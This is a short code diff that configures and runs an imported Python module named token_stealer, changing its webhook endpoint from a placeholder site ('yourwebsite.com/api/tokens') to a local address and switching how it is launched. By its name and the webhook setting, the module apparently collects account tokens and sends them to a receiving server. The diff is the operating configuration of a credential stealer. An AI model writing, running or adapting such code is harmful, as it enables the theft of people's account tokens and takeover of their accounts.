@@ -1,5 +1,4 @@
 import token_stealer
 
-token_stealer.WEBHOOK_URL = 'https://yourwebsite.com/api/tokens'
-token_stealer.MODE = "RAW"
-token_stealer.main()
+token_stealer.WEBHOOK_URL = 'http://127.0.0.1:5000/api/tokens'
+token_stealer.raw()
